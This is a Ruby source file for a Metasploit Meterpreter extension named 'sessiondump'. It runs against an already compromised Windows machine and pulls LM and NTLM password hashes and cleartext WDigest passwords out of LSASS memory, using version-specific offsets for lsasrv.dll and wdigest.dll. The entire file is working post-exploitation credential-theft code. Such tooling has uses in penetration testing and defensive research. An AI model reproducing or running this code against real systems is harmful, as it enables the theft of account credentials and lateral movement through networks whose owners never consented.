#!/usr/bin/env ruby

require 'rex/post/meterpreter/extensions/sessiondump/tlv'

module Rex
module Post
module Meterpreter
module Extensions
module SessionDump

###
#
# This meterpreter extension can be used to dump hashes and passwords from memory
# Compatible with x86 and x64 systems from Windows XP/2003 to Windows 8/2012
# Author : Steeve Barbeau (steeve DOT barbeau AT hsc DOT fr)
# http://www.hsc.fr/ressources/outils/sessiondump/index.html.en
#
###
class SessionDump < Extension

	def initialize(client)
		super(client, 'sessiondump')

		client.register_extension_aliases(
			[
				{
					'name' => 'sessiondump',
					'ext'  => self
				},
			])
	end

	def read_csv_file(file_path, dll_name)
		# Read CSV file containing offsets for lsasrv.dll or wdigest.dll
		f = open(file_path, 'r')
		f_content = f.readlines()
		f.close()

		csv_parsed = {}
		f_content.each do |l|
			line_parsed = l.split(',')

			if dll_name == 'lsasrv.dll'
				csv_parsed["#{line_parsed[0]}.#{line_parsed[1]}"] = {
								'encryptmemory' => line_parsed[2],
								'logon_session_list_addr' => line_parsed[3],
								'logon_session_list_count' => line_parsed[4],
								'feedback_addr' => line_parsed[5],
								'deskey_ptr_addr' => line_parsed[6],
								'threedeskey_ptr_addr' => line_parsed[7],
								'iv_addr' => line_parsed[8].chomp.chomp}
			elsif dll_name == 'wdigest.dll'
				csv_parsed["#{line_parsed[0]}.#{line_parsed[1]}"] = {
								'wdigest_session_list' => line_parsed[2].chomp.chomp}
			end
		end
		return csv_parsed
	end

	def read_csv_input(dll_name, csv_data)
		# Read offsets passed to get_hashes and get_password via -i option
		input_parsed = csv_data.split(',', 8)

		csv_parsed = {}
		if dll_name == 'lsasrv.dll'
			if input_parsed.size() < 7
				return nil
			end
			csv_parsed['encryptmemory'] = input_parsed[0].to_i
			csv_parsed['logon_session_list_addr'] = input_parsed[1].to_i
			csv_parsed['logon_session_list_count'] = input_parsed[2].to_i
			csv_parsed['feedback_addr'] = input_parsed[3].to_i
			csv_parsed['deskey_ptr_addr'] = input_parsed[4].to_i
			csv_parsed['threedeskey_ptr_addr'] = input_parsed[5].to_i
			csv_parsed['iv_addr'] = input_parsed[6].to_i
		end
		if dll_name == 'wdigest.dll'
			if input_parsed.size() != 8
				return nil
			end
			csv_parsed['wdigest_session_list'] = input_parsed[7].to_i
		end
		return csv_parsed
	end

	def get_dll_version(dll_name)
		# Get version of lsasrv.dll or wdigest.dll
		req = Packet.create_request('getDllVer')
		req.add_tlv(TLV_TYPE_VERSION_DLL_REQUEST, dll_name)
		res = client.send_request(req)
		dll_version = res.get_tlv_value(TLV_TYPE_VERSION_DLL_ANSWER)
		if dll_version == "error"
			return nil
		else
			return dll_version
		end
	end

	def get_symbols_addresses(path_file, dll_version, dll_name)
		# Parse CSV file in order to get offsets relating to DLL versions of
		# the compromise computer
		csv_content = client.sessiondump.read_csv_file(path_file, dll_name)
		arch = client.sys.config.sysinfo['Architecture']
		csv_key = "#{dll_version}.#{arch}"

		if csv_content.key?(csv_key)
			symb_addr = csv_content[csv_key]
			return symb_addr
		else
			return nil
		end
	end

	def get_hashes(symbols_addr)
		# Extract hashes from Windows memory
		req = Packet.create_request('getHashes')
		symbols_addr.each_pair do |k,v|
			req.add_tlv(TLV_TYPE_SYMBOLS_NAME, k)
			req.add_tlv(TLV_TYPE_SYMBOLS_ADDR, v)
		end
		res = client.send_request(req)

		sessions = []
		session = {}

		res.each do |t|
			if t.type == TLV_TYPE_ERROR
				session['error'] = t.value
				sessions.push(session)
			elsif t.type == TLV_TYPE_DOMAIN
				session['domain'] = t.value
			elsif t.type == TLV_TYPE_USER
				session['user'] = t.value
			elsif t.type == TLV_TYPE_LM
				session['lm'] = t.value
			elsif t.type == TLV_TYPE_NTLM
				session['ntlm'] = t.value
				sessions.push(session)
				session = {}
			end
		end
		return sessions.uniq
	end

	def get_wdigest_passwords(symbols_addr)
		# Extract passwords from Windows memory
		req = Packet.create_request('getWdigestPasswords')
		symbols_addr.each_pair do |k,v|
			req.add_tlv(TLV_TYPE_SYMBOLS_NAME, k)
			req.add_tlv(TLV_TYPE_SYMBOLS_ADDR, v)
		end
		res = client.send_request(req)

		sessions = []
		session = {}

		res.each do |t|
			if t.type == TLV_TYPE_ERROR
				session['error'] = t.value
				sessions.push(session)
			elsif t.type == TLV_TYPE_DOMAIN
				session['domain'] = t.value
			elsif t.type == TLV_TYPE_USER
				session['user'] = t.value
			elsif t.type == TLV_TYPE_PWD
				session['pwd'] = t.value
				sessions.push(session)
				session = {}
			end
		end
		return sessions.uniq
	end

end

end; end; end; end; end
